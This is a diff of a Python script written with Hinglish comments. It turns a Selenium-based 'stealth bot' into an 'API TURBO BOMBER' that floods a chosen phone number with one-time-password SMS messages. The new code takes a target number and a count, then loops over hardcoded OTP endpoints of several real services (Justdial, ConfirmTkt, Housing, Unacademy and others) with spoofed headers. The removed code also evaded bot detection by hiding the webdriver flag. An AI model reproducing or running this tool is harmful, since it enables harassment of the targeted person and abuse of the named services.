@@ -1,127 +1,112 @@
-import time
+import requests
 import os
-import random
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.chrome.service import Service
+import json
+import time
 
-# --- CONFIG ---
-SMS_FILE = "sms.txt"
-success, failed = 0, 0
+# --- COLOR CODES ---
+GREEN = "\033[92m"
+RED = "\033[91m"
+RESET = "\033[0m"
 
-def create_driver():
-    options = Options()
-    options.add_argument("--headless")
-    options.add_argument("--no-sandbox")
-    options.add_argument("--disable-dev-shm-usage")
-    options.add_argument("--disable-blink-features=AutomationControlled")
-    # Real Mobile User Agent
-    ua_list = [
-        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.036) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.71 Mobile Safari/537.36"
-    ]
-    options.add_argument(f"user-agent={random.choice(ua_list)}")
-    
-    service = Service('/data/data/com.termux/files/usr/bin/chromedriver')
-    try:
-        driver = webdriver.Chrome(service=service, options=options)
-        # --- STEALTH: REMOVE BOT FOOTPRINT ---
-        driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
-            "source": """
-                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
-                window.chrome = { runtime: {} };
-            """
-        })
-        driver.set_page_load_timeout(60) # High timeout for slow 4G
-        return driver
-    except: return None
+# --- API DATABASE ---
+# Jo JSON aapne diya tha, uske kuch working examples yahan hain
+# Aap is list mein aur bhi APIs add kar sakte hain
+SMS_APIS = [
+    {
+        "name": "justdial",
+        "method": "GET",
+        "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
+        "params": {"mobile": "{target}"}
+    },
+    {
+        "name": "confirmtkt",
+        "method": "GET",
+        "url": "https://securedapi.confirmtkt.com/api/platform/register",
+        "params": {"newOtp": "true", "mobileNumber": "{target}"}
+    },
+    {
+        "name": "housing",
+        "method": "POST",
+        "url": "https://login.housing.com/api/v2/send-otp",
+        "data": {"phone": "{target}"}
+    },
+    {
+        "name": "frotels",
+        "method": "POST",
+        "url": "https://www.frotels.com/appsendsms.php",
+        "data": {"mobno": "{target}"}
+    },
+    {
+        "name": "unacademy",
+        "method": "POST",
+        "url": "https://unacademy.com/api/v1/user/get_app_link/",
+        "data": {"phone": "{target}"}
+    }
+]
 
-def attempt_action(driver, site, mobile):
-    try:
-        # Step 1: Wait for any input box (Smart Wait)
-        time.sleep(10) # 4G ke liye zyada wait
-        
-        # Swiggy/Zomato special handling
-        if "swiggy" in site or "zomato" in site:
-            driver.execute_script("window.scrollTo(0, 500);")
-            time.sleep(2)
-
-        # Step 2: Input search
-        m_box = None
-        inputs = driver.find_elements(By.TAG_NAME, "input")
-        for i in inputs:
-            attr = str(i.get_attribute("outerHTML")).lower()
-            if any(k in attr for k in ["tel", "mobile", "phone", "number"]):
-                if i.is_displayed():
-                    m_box = i; break
-        
-        if not m_box:
-            # Login button click logic
-            buttons = driver.find_elements(By.TAG_NAME, "button")
-            for b in buttons:
-                if any(k in b.text.lower() for k in ["login", "sign", "otp"]):
-                    driver.execute_script("arguments[0].click();", b)
-                    time.sleep(5); break
-            
-            # Re-check for box
-            inputs = driver.find_elements(By.TAG_NAME, "input")
-            for i in inputs:
-                if "tel" in str(i.get_attribute("type")): m_box = i; break
-
-        if m_box:
-            m_box.clear()
-            m_box.send_keys(mobile)
-            time.sleep(2)
-            
-            # Step 3: Click Submit
-            btns = driver.find_elements(By.TAG_NAME, "button")
-            for b in btns:
-                if any(k in b.text.lower() for k in ["otp", "continue", "login", "send"]):
-                    driver.execute_script("arguments[0].click();", b)
-                    time.sleep(5)
-                    return True
-    except: pass
-    return False
-
-def attempt(site, mobile):
-    global success, failed
-    driver = create_driver()
-    if not driver: return
-    try:
-        driver.get(site)
-        if attempt_action(driver, site, mobile):
-            print(f"[+] SUCCESS: {site}")
-            success += 1
-        else:
-            print(f"[-] FAILED: {site}")
-            failed += 1
-    except:
-        print(f"[!] TIMEOUT (Slow Net): {site}")
-        failed += 1
-    finally:
-        driver.quit()
+def clear_screen():
+    os.system("clear")
 
 def main():
-    os.system("clear")
-    print("========================================")
-    print("    🔥 BULLETPROOF STEALTH BOT v8.0     ")
-    print("========================================\n")
-    
+    clear_screen()
+    print(f"{GREEN}========================================")
+    print("      🚀 API TURBO BOMBER v9.0         ")
+    print(f"========================================{RESET}\n")
+
+    # Wahi purana feature: Target Number mangna
     target = input("Enter Target Number: ")
-    if not os.path.exists(SMS_FILE):
-        print("sms.txt not found!"); return
-        
-    with open(SMS_FILE, "r") as f:
-        links = [l.strip() for l in f if l.strip()]
-
-    print(f"\n[*] Running on {len(links)} sites. Flight Mode trick recommended.\n")
     
-    for link in links:
-        attempt(link, target)
-        time.sleep(3) # Anti-ban gap
+    # Mode selection
+    print("\nSelect Mode:")
+    print("1. SMS Mode (API Fast)")
+    print("2. Call Mode (Coming Soon)")
+    choice = input("\nChoice: ")
 
-    print(f"\n--- DONE | SUCCESS: {success} | FAILED: {failed} ---")
+    if choice != "1":
+        print("Abhi sirf SMS Mode ready hai!"); return
+
+    limit = input("How many SMS to send? (e.g. 50): ")
+    
+    print(f"\n{GREEN}[*] Starting API Attack on {target}...{RESET}")
+    print("[*] Press CTRL+C to stop.\n")
+
+    count = 0
+    try:
+        while count < int(limit):
+            for api in SMS_APIS:
+                if count >= int(limit): break
+                
+                try:
+                    # Target number ko JSON ki jagah fit karna
+                    url = api["url"]
+                    
+                    headers = {
+                        "User-Agent": "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
+                        "Referer": "https://google.com"
+                    }
+
+                    if api["method"] == "GET":
+                        # Params mein target number dalna
+                        params = {k: v.replace("{target}", target) for k, v in api.get("params", {}).items()}
+                        response = requests.get(url, params=params, headers=headers, timeout=5)
+                    
+                    else:
+                        # POST data mein target number dalna
+                        data = {k: v.replace("{target}", target) for k, v in api.get("data", {}).items()}
+                        response = requests.post(url, data=data, headers=headers, timeout=5)
+
+                    count += 1
+                    print(f"{GREEN}[{count}] Sent via {api['name']} | Status: {response.status_code}{RESET}")
+                    time.sleep(0.5) # Fast speed but safe gap
+
+                except Exception:
+                    print(f"{RED}[!] Failed via {api['name']}{RESET}")
+                    continue
+
+    except KeyboardInterrupt:
+        print(f"\n{RED}[!] Stopped by user.{RESET}")
+
+    print(f"\n{GREEN}--- ATTACK FINISHED: {count} Sent ---{RESET}")
 
 if __name__ == "__main__":
     main()
